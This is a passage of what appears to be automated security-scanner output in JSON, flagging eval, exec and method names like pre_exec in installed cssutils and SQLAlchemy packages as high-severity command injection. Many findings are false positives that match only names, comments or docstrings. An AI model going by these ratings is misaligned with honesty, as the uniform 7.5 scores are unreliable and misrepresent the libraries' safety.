            "context": "\n        assert sel in str(s)\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n        assert sel == s2.selectorText\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_selector.py",
            "line": 457,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "\n        assert sel in str(s)\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n        assert sel == s2.selectorText\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssstylesheet.py",
            "line": 886,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "        assert href in str(s)\n        assert title in str(s)\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n        assert href == s2.href\n        assert title == s2.title",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_csscharsetrule.py",
            "line": 113,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "\n        assert encoding in str(s)\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n        assert encoding == s2.encoding\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_value.py",
            "line": 175,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "'expression(eval(document.documentElement.scrollTop))': 'expression(eval(document.documentElement.scrollTop))',",
            "context": "            r'expression(document.width == \"1\")': 'expression(document.width==\"1\")',\n            'alpha(opacity=80)': 'alpha(opacity=80)',\n            'alpha( opacity = 80 , x=2  )': 'alpha(opacity=80, x=2)',\n            'expression(eval(document.documentElement.scrollTop))': 'expression(eval(document.documentElement.scrollTop))',\n            # TODO\n            #            u'expression((function(ele){ele.style.behavior=\"none\";})(this))':\n            #                u'expression((function(ele){ele.style.behavior=\"none\";})(this))',",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_value.py",
            "line": 175,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "'expression(eval(document.documentElement.scrollTop))': 'expression(eval(document.documentElement.scrollTop))',",
            "context": "            r'expression(document.width == \"1\")': 'expression(document.width==\"1\")',\n            'alpha(opacity=80)': 'alpha(opacity=80)',\n            'alpha( opacity = 80 , x=2  )': 'alpha(opacity=80, x=2)',\n            'expression(eval(document.documentElement.scrollTop))': 'expression(eval(document.documentElement.scrollTop))',\n            # TODO\n            #            u'expression((function(ele){ele.style.behavior=\"none\";})(this))':\n            #                u'expression((function(ele){ele.style.behavior=\"none\";})(this))',",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_value.py",
            "line": 378,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "\n        assert cssText in str(s)\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n        assert cssText == s2.cssText\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssmediarule.py",
            "line": 440,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "\n        assert mediaText in str(s)\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n        assert mediaText == s2.media.mediaText\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_selectorlist.py",
            "line": 149,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "\n        assert sel[0] in str(s)\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n        assert sel[0] == s2.selectorText\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssfontfacerule.py",
            "line": 238,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "\n        assert style in str(s)\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n        assert style == s2.style.cssText\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssvalue.py",
            "line": 356,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "\n        assert cssText in str(s)\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n        assert cssText == s2.cssText\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssvalue.py",
            "line": 848,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "        assert v in str(s)\n        assert 'CSS_NUMBER' in str(s)\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n        assert v == s2.cssText\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssvalue.py",
            "line": 908,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# not \"eval()\"able!",
            "context": "        assert 'length=2' in str(s)\n        assert v in str(s)\n\n        # not \"eval()\"able!\n        # s2 = eval(repr(s))\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssvalue.py",
            "line": 909,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# s2 = eval(repr(s))",
            "context": "        assert v in str(s)\n\n        # not \"eval()\"able!\n        # s2 = eval(repr(s))\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssvariablesrule.py",
            "line": 144,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "r2 = eval(repr(r))",
            "context": "        r.cssText = '@variables { xxx: 1 }'\n        assert 'xxx' in str(r)\n\n        r2 = eval(repr(r))\n        assert isinstance(r2, r.__class__)\n        assert r.cssText == r2.cssText\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_mediaquery.py",
            "line": 100,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "        mediaText = 'tv and (color)'\n        s = cssutils.stylesheets.MediaQuery(mediaText=mediaText)\n        assert mediaText in str(s)\n        s2 = eval(repr(s))\n        assert mediaText == s2.mediaText\n        assert isinstance(s2, s.__class__)\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_marginrule.py",
            "line": 90,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "\n        assert margin in str(s)\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n        assert margin == s2.margin\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssnamespacerule.py",
            "line": 213,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "        assert namespaceURI in str(s)\n        assert prefix in str(s)\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n        assert namespaceURI == s2.namespaceURI\n        assert prefix == s2.prefix",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssstyledeclaration.py",
            "line": 582,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "\n        assert \"2\" in str(s)  # length\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n\n    def test_valid(self):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssvariablesdeclaration.py",
            "line": 352,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "\n        assert \"2\" in str(s)  # length\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssunknownrule.py",
            "line": 138,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "        \"CSSUnknownRule.__repr__(), .__str__()\"\n        s = cssutils.css.CSSUnknownRule(cssText='@x;')\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssimportrule.py",
            "line": 423,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "        assert href in str(s)\n\n        # repr()\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n        assert href == s2.href\n        assert mediaText == s2.media.mediaText",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_csscomment.py",
            "line": 61,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "\n        s = cssutils.css.CSSComment(cssText=text)\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n        assert text == s2.cssText\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/css/colors.py",
            "line": 7,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "eval(row[4].text_content().strip())",
            "context": "    print [\n        (\n            row[2].text_content().strip(),\n            eval(row[4].text_content().strip())\n        )\n        for row in lxml.html.parse('http://www.w3.org/TR/css3-color/')\n            .xpath(\"//*[@class='colortable']//tr[position()>1]\")",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/util/typing.py",
            "line": 274,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "annotation = eval(expression, cls_namespace, locals_)",
            "context": "            # is not the usual way variables would resolve.\n            cls_namespace.update(base_globals)\n\n            annotation = eval(expression, cls_namespace, locals_)\n        else:\n            annotation = eval(expression, base_globals, locals_)\n    except Exception as err:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/util/typing.py",
            "line": 276,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "annotation = eval(expression, base_globals, locals_)",
            "context": "\n            annotation = eval(expression, cls_namespace, locals_)\n        else:\n            annotation = eval(expression, base_globals, locals_)\n    except Exception as err:\n        raise NameError(\n            f\"Could not de-stringify annotation {expression!r}\"",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/util/typing.py",
            "line": 302,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# name only, just look in globals.  eval() works perfectly fine here,",
            "context": "            f\"resolve name {name}\"\n        ) from ke\n\n    # name only, just look in globals.  eval() works perfectly fine here,\n    # however we are seeking to have this be faster, as this occurs for\n    # every Mapper[] keyword, etc. depending on configuration\n    try:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/util/langhelpers.py",
            "line": 419,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, env)",
            "context": "def _exec_code_in_env(\n    code: Union[str, types.CodeType], env: Dict[str, Any], fn_name: str\n) -> Callable[..., Any]:\n    exec(code, env)\n    return env[fn_name]  # type: ignore[no-any-return]\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/util/langhelpers.py",
            "line": 1053,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(py, env)",
            "context": "        env: Dict[str, types.FunctionType] = (\n            from_instance is not None and {name: from_instance} or {}\n        )\n        exec(py, env)\n        try:\n            env[method].__defaults__ = fn.__defaults__\n        except AttributeError:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/util/langhelpers.py",
            "line": 2044,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, env)",
            "context": "def attrsetter(attrname):\n    code = \"def set(obj, value):    obj.%s = value\" % attrname\n    env = locals().copy()\n    exec(code, env)\n    return env[\"set\"]\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/context.py",
            "line": 285,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def orm_pre_session_exec(",
            "context": "        return super().create_for_statement(statement, compiler, **kw)\n\n    @classmethod\n    def orm_pre_session_exec(\n        cls,\n        session,\n        statement,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/context.py",
            "line": 335,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def orm_pre_session_exec(",
            "context": "    \"\"\"ORM compile state that is a passthrough, except for autoflush.\"\"\"\n\n    @classmethod\n    def orm_pre_session_exec(\n        cls,\n        session,\n        statement,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/context.py",
            "line": 492,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def orm_pre_session_exec(",
            "context": "        return _column_descriptions(statement)\n\n    @classmethod\n    def orm_pre_session_exec(\n        cls,\n        session,\n        statement,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/_orm_constructors.py",
            "line": 1102,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "argument is interpreted using Python's ``eval()`` function.",
            "context": "      parent-mapped :class:`_schema.Table`.\n\n      .. warning:: When passed as a Python-evaluable string, the\n         argument is interpreted using Python's ``eval()`` function.\n         **DO NOT PASS UNTRUSTED INPUT TO THIS STRING**.\n         See :ref:`declarative_relationship_eval` for details on\n         declarative evaluation of :func:`_orm.relationship` arguments.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/_orm_constructors.py",
            "line": 1339,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "argument is interpreted using Python's ``eval()`` function.",
            "context": "      Declarative.\n\n      .. warning:: When passed as a Python-evaluable string, the\n         argument is interpreted using Python's ``eval()`` function.\n         **DO NOT PASS UNTRUSTED INPUT TO THIS STRING**.\n         See :ref:`declarative_relationship_eval` for details on\n         declarative evaluation of :func:`_orm.relationship` arguments.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/_orm_constructors.py",
            "line": 1541,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "argument is interpreted using Python's ``eval()`` function.",
            "context": "      be passed as a Python-evaluable string when using Declarative.\n\n      .. warning:: When passed as a Python-evaluable string, the\n         argument is interpreted using Python's ``eval()`` function.\n         **DO NOT PASS UNTRUSTED INPUT TO THIS STRING**.\n         See :ref:`declarative_relationship_eval` for details on\n         declarative evaluation of :func:`_orm.relationship` arguments.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/_orm_constructors.py",
            "line": 1638,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "argument is interpreted using Python's ``eval()`` function.",
            "context": "      Declarative.\n\n      .. warning:: When passed as a Python-evaluable string, the\n         argument is interpreted using Python's ``eval()`` function.\n         **DO NOT PASS UNTRUSTED INPUT TO THIS STRING**.\n         See :ref:`declarative_relationship_eval` for details on\n         declarative evaluation of :func:`_orm.relationship` arguments.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/_orm_constructors.py",
            "line": 1657,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "argument is interpreted using Python's ``eval()`` function.",
            "context": "      Declarative.\n\n      .. warning:: When passed as a Python-evaluable string, the\n         argument is interpreted using Python's ``eval()`` function.\n         **DO NOT PASS UNTRUSTED INPUT TO THIS STRING**.\n         See :ref:`declarative_relationship_eval` for details on\n         declarative evaluation of :func:`_orm.relationship` arguments.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/_orm_constructors.py",
            "line": 1699,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "argument is interpreted using Python's ``eval()`` function.",
            "context": "      Declarative.\n\n      .. warning:: When passed as a Python-evaluable string, the\n         argument is interpreted using Python's ``eval()`` function.\n         **DO NOT PASS UNTRUSTED INPUT TO THIS STRING**.\n         See :ref:`declarative_relationship_eval` for details on\n         declarative evaluation of :func:`_orm.relationship` arguments.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/events.py",
            "line": 2015,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def after_flush_postexec(",
            "context": "\n        \"\"\"\n\n    def after_flush_postexec(\n        self, session: Session, flush_context: UOWTransaction\n    ) -> None:\n        \"\"\"Execute after flush has completed, and after the post-exec",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/session.py",
            "line": 2191,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ") = compile_state_cls.orm_pre_session_exec(",
            "context": "                (\n                    statement,\n                    execution_options,\n                ) = compile_state_cls.orm_pre_session_exec(\n                    self,\n                    statement,\n                    params,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/session.py",
            "line": 2222,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# now run orm_pre_session_exec() \"for real\".   if there were",
            "context": "            execution_options = orm_exec_state.local_execution_options\n\n        if compile_state_cls is not None:\n            # now run orm_pre_session_exec() \"for real\".   if there were\n            # event hooks, this will re-run the steps that interpret\n            # new execution_options into load_options / update_delete_options,\n            # which we assume the event hook might have updated.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/session.py",
            "line": 2230,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ") = compile_state_cls.orm_pre_session_exec(",
            "context": "            (\n                statement,\n                execution_options,\n            ) = compile_state_cls.orm_pre_session_exec(\n                self,\n                statement,\n                params,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/session.py",
            "line": 4475,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.dispatch.after_flush_postexec(self, flush_context)",
            "context": "            #    assert self.identity_map._modified == \\\n            #            self.identity_map._modified.difference(objects)\n\n            self.dispatch.after_flush_postexec(self, flush_context)\n\n            transaction.commit()\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/instrumentation.py",
            "line": 744,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(func_text, env)",
            "context": "\n    env = locals().copy()\n    env[\"__name__\"] = __name__\n    exec(func_text, env)\n    __init__ = env[\"__init__\"]\n    __init__.__doc__ = original_init.__doc__\n    __init__._sa_original_init = original_init",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/bulk_persistence.py",
            "line": 663,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def orm_pre_session_exec(",
            "context": "        raise NotImplementedError()\n\n    @classmethod\n    def orm_pre_session_exec(\n        cls,\n        session,\n        statement,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/bulk_persistence.py",
            "line": 1165,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def orm_pre_session_exec(",
            "context": "    select_statement: Optional[FromStatement] = None\n\n    @classmethod\n    def orm_pre_session_exec(\n        cls,\n        session,\n        statement,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/clsregistry.py",
            "line": 533,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "x = eval(self.arg, globals(), self._dict)",
            "context": "\n    def __call__(self) -> Any:\n        try:\n            x = eval(self.arg, globals(), self._dict)\n\n            if isinstance(x, _GetColumns):\n                return x.cls",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/strategies.py",
            "line": 2887,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def load_collection_from_joined_exec(state, dict_, row):",
            "context": "            if inst is not None:\n                result_list.append(inst)\n\n        def load_collection_from_joined_exec(state, dict_, row):\n            _instance(row)\n\n        populators[\"new\"].append(",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/strategies.py",
            "line": 2926,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def load_scalar_from_joined_exec(state, dict_, row):",
            "context": "                # that the other doesn't.\n                dict_[key] = existing\n\n        def load_scalar_from_joined_exec(state, dict_, row):\n            _instance(row)\n\n        populators[\"new\"].append((self.key, load_scalar_from_joined_new_row))",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/engine/default.py",
            "line": 1777,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def pre_exec(self):",
            "context": "    def create_server_side_cursor(self) -> DBAPICursor:\n        raise NotImplementedError()\n\n    def pre_exec(self):\n        pass\n\n    def get_out_parameter_values(self, names):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/engine/default.py",
            "line": 1785,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def post_exec(self):",
            "context": "            \"This dialect does not support OUT parameters\"\n        )\n\n    def post_exec(self):\n        pass\n\n    def get_result_processor(self, type_, colname, coltype):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/engine/default.py",
            "line": 1803,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "calculated within post_exec().",
            "context": "\n        This may involve calling special cursor functions, issuing a new SELECT\n        on the cursor (or a new one), or returning a stored value that was\n        calculated within post_exec().\n\n        This function will only be called for dialects which support \"implicit\"\n        primary key generation, keep preexecute_autoincrement_sequences set to",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/engine/base.py",
            "line": 1837,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "context.pre_exec()",
            "context": "        if self._transaction is None:\n            self._autobegin()\n\n        context.pre_exec()\n\n        if context.execute_style is ExecuteStyle.INSERTMANYVALUES:\n            return self._exec_insertmany_context(dialect, context)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/engine/base.py",
            "line": 1977,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "context.post_exec()",
            "context": "                    context.executemany,\n                )\n\n            context.post_exec()\n\n            result = context._setup_result_proxy()\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/engine/base.py",
            "line": 2145,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "context.post_exec()",
            "context": "                rowcount += imv_batch.current_batch_size\n\n        try:\n            context.post_exec()\n\n            if preserve_rowcount:\n                context._rowcount = rowcount  # type: ignore[attr-defined]",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/engine/interfaces.py",
            "line": 2938,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "sql.Compiled object by the time pre_exec() has completed.\"\"\"",
            "context": "    statement: str\n    \"\"\"string version of the statement to be executed.  Is either\n      passed to the constructor, or must be created from the\n      sql.Compiled object by the time pre_exec() has completed.\"\"\"\n\n    invoked_statement: Optional[Executable]\n    \"\"\"The Executable statement object that was given in the first place.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/engine/interfaces.py",
            "line": 3082,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def pre_exec(self) -> None:",
            "context": "\n        raise NotImplementedError()\n\n    def pre_exec(self) -> None:\n        \"\"\"Called before an execution of a compiled statement.\n\n        If a compiled statement was passed to this ExecutionContext,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/engine/interfaces.py",
            "line": 3128,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def post_exec(self) -> None:",
            "context": "        \"\"\"\n        raise NotImplementedError()\n\n    def post_exec(self) -> None:\n        \"\"\"Called after the execution of a compiled statement.\n\n        If a compiled statement was passed to this ExecutionContext,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/sql/lambdas.py",
            "line": 1262,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, vars_, vars_)",
            "context": "        code += \"        return %s\\n\" % \", \".join(\"i%d\" % i for i in argrange)\n        code += \"    return closure.__closure__\"\n        vars_ = {\"o%d\" % i: cell_values[i] for i in argrange}\n        exec(code, vars_, vars_)\n        closure = vars_[\"make_cells\"]()\n\n        func = type(f)(",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/testing/plugin/pytestplugin.py",
            "line": 621,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, env)",
            "context": "        # the top; exec'ed code will use non-evaluated annotations\n        # which allows us to be more flexible with code rendering\n        # in format_argpsec_plus()\n        exec(code, env)\n        return env[fn_name]\n\n    def decorate(fn, add_positional_parameters=()):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mssql/base.py",
            "line": 1878,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def pre_exec(self):",
            "context": "\n        return statement\n\n    def pre_exec(self):\n        \"\"\"Activate IDENTITY_INSERT if needed.\"\"\"\n\n        if self.isinsert:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mssql/base.py",
            "line": 1927,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def post_exec(self):",
            "context": "                    self,\n                )\n\n    def post_exec(self):\n        \"\"\"Disable IDENTITY_INSERT if enabled.\"\"\"\n\n        conn = self.root_connection",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mssql/pyodbc.py",
            "line": 568,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def pre_exec(self):",
            "context": "class MSExecutionContext_pyodbc(MSExecutionContext):\n    _embedded_scope_identity = False\n\n    def pre_exec(self):\n        \"\"\"where appropriate, issue \"select scope_identity()\" in the same\n        statement.\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mssql/pyodbc.py",
            "line": 581,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "super().pre_exec()",
            "context": "\n        \"\"\"\n\n        super().pre_exec()\n\n        # don't embed the scope_identity select into an\n        # \"INSERT .. DEFAULT VALUES\"",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mssql/pyodbc.py",
            "line": 594,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def post_exec(self):",
            "context": "\n            self.statement += \"; select scope_identity()\"\n\n    def post_exec(self):\n        if self._embedded_scope_identity:\n            # Fetch the last inserted id from the manipulated statement\n            # We may have to skip over a number of result sets with",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mssql/pyodbc.py",
            "line": 620,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "super().post_exec()",
            "context": "\n            self.cursor_fetch_strategy = _cursor._NO_CURSOR_DML\n        else:\n            super().post_exec()\n\n\nclass MSDialect_pyodbc(PyODBCConnector, MSDialect):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/postgresql/asyncpg.py",
            "line": 457,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def pre_exec(self):",
            "context": "        ):\n            self.dialect._invalidate_schema_cache()\n\n    def pre_exec(self):\n        if self.isddl:\n            self.dialect._invalidate_schema_cache()\n",
            "cvss_score": 7.5
          },
          {
